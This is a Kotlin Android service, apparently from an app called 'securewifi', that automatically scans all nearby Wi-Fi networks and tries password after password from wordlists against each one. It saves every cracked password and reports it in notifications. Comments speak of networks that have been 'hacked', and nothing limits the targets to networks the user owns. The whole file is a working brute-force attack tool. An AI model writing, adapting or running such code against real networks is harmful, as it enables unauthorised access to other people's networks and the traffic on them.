package com.practice.securewifi.connect

import android.Manifest
import android.app.*
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.graphics.Color
import android.net.wifi.WifiConfiguration
import android.net.wifi.WifiManager
import android.os.*
import androidx.annotation.RequiresApi
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.app.NotificationManagerCompat
import androidx.core.content.ContextCompat
import com.practice.securewifi.R
import com.practice.securewifi.app.MainActivity
import com.practice.securewifi.data.dao.TriedPasswordsDao
import com.practice.securewifi.data.dao.WifiCheckResultDao
import com.practice.securewifi.data.database.WifiSafetyDatabase
import com.practice.securewifi.data.entity.WifiCheckResult
import com.practice.securewifi.data.entity.WifiPasswordsCrossRef
import com.practice.securewifi.data.interactor.CustomPasswordListInteractor
import com.practice.securewifi.data.interactor.FixedPasswordListsInteractor
import com.practice.securewifi.data.repository.FixedPasswordListsRepository
import com.practice.securewifi.util.WifiManagerProvider
import kotlinx.coroutines.*
import org.koin.android.ext.android.inject

class ConnectionService : Service(), ConnectivityActionReceiver.OnSampleReadyListener {

    private var foundPassword = false

    private var connection: Job = Job()

    private var wifiScanReceiverRegistered = false

    private lateinit var wifiManager: WifiManager

    private lateinit var wifiScanReceiver: BroadcastReceiver

    private lateinit var connectivityActionReceiver: ConnectivityActionReceiver

    private lateinit var triedPasswordsDao: TriedPasswordsDao

    private lateinit var wifiCheckResultDao: WifiCheckResultDao

    private lateinit var binder: LocalBinder

    private lateinit var notificationChannel: String

    private var updateListener: UpdateListener? = null

    private val coroutineScope = CoroutineScope(Dispatchers.IO)

    private var latestCommand: Command = Command.StartConnections
    private var latestMessage: Command? = null

    private var passwordListName: String? = null

    private val fixedPasswordListsInteractor by inject<FixedPasswordListsInteractor>()
    private val customPasswordListInteractor by inject<CustomPasswordListInteractor>()

    inner class LocalBinder : Binder() {
        val service: ConnectionService = this@ConnectionService
    }

    fun addListener(listener: UpdateListener) {
        updateListener = listener
    }

    fun getLatestData(): Pair<Command, Command?> {
        return Pair(latestCommand, latestMessage)
    }

    override fun onCreate() {
        connectivityActionReceiver = ConnectivityActionReceiver(this)
        val intentFilter = IntentFilter()
        intentFilter.addAction(WifiManager.NETWORK_STATE_CHANGED_ACTION)
        registerReceiver(connectivityActionReceiver, intentFilter)

        wifiManager = WifiManagerProvider.getWifiManager(applicationContext)

        triedPasswordsDao = WifiSafetyDatabase.getInstance(applicationContext).triedPasswordsDao
        wifiCheckResultDao = WifiSafetyDatabase.getInstance(applicationContext).wifiCheckResultDao

        binder = LocalBinder()

        connection.cancel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!connection.isActive) {
            passwordListName = intent?.getStringExtra(PASSWORD_LIST_PARAMETER)
            createNotification()
            wifiManager.isWifiEnabled = true
            update(Command.ShowMessageToUser(getString(R.string.starting_scan)))
            update(Command.PrepareForConnections)
            startScanningForNearbyWifi()
        } else {
            unregisterWifiScanReceiverIfRegistered()
            stopConnections()
        }
        return START_NOT_STICKY
    }

    override fun onDestroy() {
        unregisterReceiver(connectivityActionReceiver)
        unregisterWifiScanReceiverIfRegistered()
        super.onDestroy()
    }

    override fun onRebind(intent: Intent?) {
        update(latestCommand)
        latestMessage?.let {
            update(it)
        }
        super.onRebind(intent)
    }

    override fun onBind(intent: Intent?): IBinder {
        update(latestCommand)
        latestMessage?.let {
            update(it)
        }
        return binder
    }

    private fun createNotification() {
        val intent = Intent(this, MainActivity::class.java)
        intent.action = Intent.ACTION_MAIN
        intent.addCategory(Intent.CATEGORY_LAUNCHER)
        val pendingIntent = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_IMMUTABLE)

        notificationChannel = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            createNotificationChannel("my_service", "My Background Service")
        } else {
            // If earlier version channel ID is not used
            // https://developer.android.com/reference/android/support/v4/app/NotificationCompat.Builder.html#NotificationCompat.Builder(android.content.Context)
            ""
        }

        val notification = NotificationCompat.Builder(
            this,
            notificationChannel
        )
            .setContentTitle(getText(R.string.performing_connections))
            .setContentText(getText(R.string.starting_scan))
            .setSmallIcon(R.drawable.wifi_password)
            .setContentIntent(pendingIntent)
            .build()

        startForeground(PERSISTENT_NOTIFICATION_ID, notification)
    }

    private fun updateNotification(contentTitle: CharSequence, contentText: CharSequence) {
        val intent = Intent(this, MainActivity::class.java)
        intent.action = Intent.ACTION_MAIN
        intent.addCategory(Intent.CATEGORY_LAUNCHER)
        val pendingIntent = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
        val notification = NotificationCompat.Builder(
            this,
            notificationChannel
        )
            .setContentTitle(contentTitle)
            .setContentText(contentText)
            .setSmallIcon(R.drawable.wifi_password)
            .setContentIntent(pendingIntent)
            .build()

        val mNotificationManager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
        mNotificationManager.notify(PERSISTENT_NOTIFICATION_ID, notification)
    }

    private fun showNotification(contentTitle: CharSequence?, contentText: CharSequence) {
        val intent = Intent(this, MainActivity::class.java)
        intent.action = Intent.ACTION_MAIN
        intent.addCategory(Intent.CATEGORY_LAUNCHER)
        val pendingIntent = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
        val notification = NotificationCompat.Builder(
            this,
            notificationChannel
        )
            .setContentTitle(contentTitle)
            .setContentText(contentText)
            .setSmallIcon(R.drawable.wifi_password)
            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
            .setContentIntent(pendingIntent)
            .build()
        with(NotificationManagerCompat.from(this)) {
            if (ContextCompat.checkSelfPermission(
                    applicationContext,
                    Manifest.permission.POST_NOTIFICATIONS
                ) == PackageManager.PERMISSION_GRANTED
            ) {
                // notificationId is a unique int for each notification
                notify(DISMISSABLE_NOTIFICATION_ID, notification)
            }
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private fun createNotificationChannel(channelId: String, channelName: String): String {
        val chan = NotificationChannel(
            channelId,
            channelName, NotificationManager.IMPORTANCE_NONE
        )
        chan.lightColor = Color.BLUE
        chan.lockscreenVisibility = Notification.VISIBILITY_PRIVATE
        val service = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        service.createNotificationChannel(chan)
        return channelId
    }

    private fun startScanningForNearbyWifi() {
        wifiScanReceiver = object : BroadcastReceiver() {

            override fun onReceive(context: Context, intent: Intent) {
                val success = intent.getBooleanExtra(
                    WifiManager.EXTRA_RESULTS_UPDATED, false
                )
                if (success) {
                    scanSuccess()
                } else {
                    scanFailure()
                }
                unregisterWifiScanReceiverIfRegistered()
            }
        }

        registerWifiScanReceiver()

        wifiManager.startScan()

        Handler(Looper.getMainLooper()).postDelayed({
            unregisterWifiScanReceiverIfRegistered()
            if (!connection.isActive) {
                stopConnections()
            }
        }, 5000)
    }

    private fun scanSuccess() {
        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            update(Command.AskForAccessFineLocationPermission)
            return
        }
        val nearbyWifiPoints = wifiManager.scanResults

        val wifiSSIDs = nearbyWifiPoints.filter {
            it.SSID != "" /*&& WifiManager.calculateSignalLevel(
                it.level,
                10
            ) > 6*/
        }.sortedByDescending { it.level }.map { it.SSID }

        var correctPassword = ""
        var passwordCountNeeded = 0

        connection = coroutineScope.launch {

            withContext(Dispatchers.Main) {
                update(Command.StartConnections)
            }
            foundPassword = false
            var networkCount = 0
            for (networkSSID in wifiSSIDs) {
                networkCount++
                // If password was found during this search
                if (foundPassword) break

                val wifi = wifiCheckResultDao.getWifiCheckResult(networkSSID)
                // If this network hasn't ever been a subject to hacking, save it
                if (wifi == null) {
                    wifiCheckResultDao.insertWifiCheckResult(WifiCheckResult(networkSSID, null))
                } else if (wifi.correctPassword != null) {
                    // If this particular network has already been hacked
                    continue
                }
                val triedPasswords = triedPasswordsDao.getTriedPasswordsForWifi(networkSSID)

                val conf = WifiConfiguration()
                conf.SSID = "\"" + networkSSID + "\"" // String should contain ssid in quotes

                val networkPasswords = getPasswordsList(networkSSID)
                var passwordCount = 0

                for (networkPass in networkPasswords) {
                    passwordCount++

                    // If this password has already been checked for this wifi skip it
                    if (triedPasswords.contains(networkPass)) continue

                    withContext(Dispatchers.Main) {
                        update(Command.ShowMessageToUser(
                            getString(
                                R.string.attempting_to_connect,
                                networkSSID,
                                networkCount, // count of networks already checked
                                wifiSSIDs.size, // count of networks need to be checked
                                networkPass, // password currently being tried
                                passwordCount, // count of passwords already tried
                                networkPasswords.size, // password count for wifi
                                60 / (INTERVAL / 1000), // passwords a minute
                            )
                        ))
                        updateNotification(
                            getString(R.string.performing_connections),
                            getString(
                                R.string.attempting_to_connect_notification,
                                networkSSID,
                                networkCount, // count of networks already checked
                                wifiSSIDs.size, // count of networks need to be checked
                                networkPass, // password currently being tried
                                passwordCount, // count of passwords already tried
                                networkPasswords.size // password count for wifi
                            )
                        )
                    }

                    conf.preSharedKey = "\"" + networkPass + "\""
                    // only works for API < 29
                    val netId = wifiManager.addNetwork(conf)
                    if (netId != -1) {
                        wifiManager.disconnect()
                        wifiManager.enableNetwork(netId, true)
                    } else {
                        val list = wifiManager.configuredNetworks
                        for (network in list) {
                            if (network.SSID != null && network.SSID == "\"" + networkSSID + "\"") {
                                wifiManager.disconnect()
                                wifiManager.enableNetwork(network.networkId, true)
                                wifiManager.reconnect()
                                break
                            }
                        }
                    }
                    delay(INTERVAL)

                    triedPasswordsDao.insertWifiPasswordsCrossRef(
                        WifiPasswordsCrossRef(
                            networkSSID,
                            networkPass
                        )
                    )

                    if (foundPassword) {
                        correctPassword = networkPass
                        passwordCountNeeded = passwordCount
                        wifiCheckResultDao.insertWifiCheckResult(
                            WifiCheckResult(
                                networkSSID,
                                correctPassword
                            )
                        )
                        break
                    }

                }
                if (foundPassword) {
                    withContext(Dispatchers.Main) {
                        update(Command.ShowMessageToUser(
                            getString(
                                R.string.password_hacking_results,
                                networkSSID,
                                correctPassword,
                                passwordCountNeeded
                            )
                        ))
                        showNotification(
                            getString(R.string.connection_attempts_ended_success),
                            getString(
                                R.string.password_hacking_results_notification,
                                networkSSID,
                                correctPassword
                            )
                        )
                    }
                }
            }
            if (!foundPassword) {
                withContext(Dispatchers.Main) {
                    update(Command.ShowMessageToUser(
                        getString(R.string.couldnt_find_password)
                    ))
                    showNotification(
                        getString(R.string.connection_attempts_ended_nothing_found),
                        getString(R.string.couldnt_find_password_notification)
                    )
                }
            }
            withContext(Dispatchers.Main) {
                stopConnections()
            }
        }
    }

    private fun scanFailure() {
        update(Command.ShowMessageToUser(getString(R.string.scan_failure)))
        stopConnections()
    }

    private fun registerWifiScanReceiver() {
        val intentFilter = IntentFilter()
        intentFilter.addAction(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION)
        registerReceiver(wifiScanReceiver, intentFilter)
        wifiScanReceiverRegistered = true
    }

    private fun unregisterWifiScanReceiverIfRegistered() {
        if (wifiScanReceiverRegistered) {
            unregisterReceiver(wifiScanReceiver)
            wifiScanReceiverRegistered = false
        }
    }

    private fun stopConnections() {
        update(Command.StopConnections)
        connection.cancel()
        stopForegroundService()
    }

    private fun stopForegroundService() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            stopForeground(STOP_FOREGROUND_REMOVE)
        }
        stopSelf()
    }

    private suspend fun getPasswordsList(ssid: String): List<String> {
        return when (passwordListName) {
            application.getString(R.string.adaptive) -> {
                fixedPasswordListsInteractor.getFixedPasswordList(
                    FixedPasswordListsRepository.FixedPassword.ADAPTIVE,
                    ssid
                )
            }
            application.getString(R.string.most_popular) -> {
                fixedPasswordListsInteractor.getFixedPasswordList(
                    FixedPasswordListsRepository.FixedPassword.MOST_POPULAR,
                    ssid
                )
            }
            else -> {
                val listName = passwordListName
                if (listName != null) { // custom list
                    customPasswordListInteractor.getPasswordsForList(listName)
                } else { // default list
                    fixedPasswordListsInteractor.getFixedPasswordList(
                        FixedPasswordListsRepository.FixedPassword.ADAPTIVE,
                        ssid
                    )
                }
            }
        }
    }

    private fun update(command: Command) {
        updateListener?.onUpdate(command)
        if (command is Command.ShowMessageToUser) {
            latestMessage = command
        } else {
            latestCommand = command
        }
    }

    override fun onSampleDataReady() {
        foundPassword = true
    }

    companion object {

        private const val PERSISTENT_NOTIFICATION_ID = 23

        private const val DISMISSABLE_NOTIFICATION_ID = 1235

        private const val INTERVAL = 3000L

        const val PASSWORD_LIST_PARAMETER = "PasswordList"
    }
}